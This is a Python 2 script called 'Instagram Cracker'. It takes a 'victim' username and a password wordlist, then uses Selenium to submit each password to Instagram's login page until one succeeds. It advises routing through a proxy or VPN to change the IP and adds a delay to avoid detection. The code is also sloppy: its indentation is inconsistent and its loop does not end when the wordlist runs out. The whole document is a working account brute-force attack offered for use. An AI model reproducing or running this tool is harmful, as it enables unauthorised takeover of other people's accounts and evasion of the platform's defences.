#!/usr/bin/python

##########

print "\n [*] ****Welcome User****\n"

print "  ***Mojtaba Akhbari***\n" 
## oh !##


print '[!] You Can Use The Proxy Or VPN for Changing the IP'

print """
	###################################
	#                                 #
	#       *Instagram Cracker*       #
	#			          #
	########### By Mojtaba ############\n
"""


###########

#modules:

try:
	import selenium
	from selenium import webdriver
except ImportError:
	print"[x] Selenium module Is not exists ! Setup it" 


import time




# Function for send to elem:


def send_v():
				username = raw_input("[+] Enter The Victim Username:")
				def passE():	
					
						password = raw_input("[+] Enter The Direction of Password List:")
						try:
							f = open(password,'r')
						except IOError:
							print"\n[x] Error: Cannot Find File or read Data !"
							print"[!] Please Check Your File or Direction of File  \n"
							return passE()
						else:
						
							delay = input("[+] Enter The Seconds For Delay (example= 3):")
							time.sleep(2)			
							print "\n[*] Using %s Seconds For Delay..." %(delay)
							time.sleep(2)
							print "\n[*] Please wait ... Don't Close"
							time.sleep(2)
							print "\n[*] Processing ..."
							driver = webdriver.Firefox()
							driver.get("https://instagram.com/" + username)
							if driver.title == 'Instagram':
								failed_u = raw_input("\n[x] The Username is Not Exists ! Press Enter To Try Again or Press 0 To Exit ...:")
								driver.quit()
								sys_input = [0,'']
								if (failed_u in sys_input):
									if failed_u==0:
										driver.quit()
										print "\n[!] Written By Mojtaba(Mr.Python)" 
										print "\n[*] guardiran.org" 
										print "\n     Good Bye !"
									if failed_u=='':
										return send_v()
								else:
									b = input("[x] Unknown Entry ! Try Again by Press 1 :")
									print"\n"
									inputing_p = [1]
									if (b in inputing_p):
										return send_v()
									else:
										print"[x] Unknown Entry ! "
										return send_v()
							else:
								driver.quit()
								print"\n[*] Ok The Username Checked ! Please Wait ...\n"
								def brute():
									driver = webdriver.Firefox()
									driver.get("https://instagram.com/accounts/login/")
				        				search_field = driver.find_element_by_name("username")
									search_field.clear()
									search_field.send_keys(username)
									while f:
										search_field = driver.find_element_by_name("password")
										search_field.clear()
										line = f.readline()
										print "Trying With Password:",line
										search_field.send_keys(line)
										search_field.submit()
										time.sleep(delay)
										if driver.current_url == 'https://www.instagram.com/':
											print "\n[!] Login Successfull !"
											print "[!] The Password Is :", line
											driver.quit()
											print "\n[!] Written By Mojtaba Akhbari"
											print "   Good Bye"
											
									
	
										else:
								
											continue

					
								brute()

					
				passE()
				
			
				
			
send_v()	


######### !!!!!!!!!!!!!!!!! You can change the delay in ( time.sleep() ) , ex. time.sleep(6)!!!!!!!!!!!




###.............................////////////Mojtaba Akhbari////////////.....................................

############################# IRANIAN PROGRAMMER ##############################






	
		
		
		
		
		
		
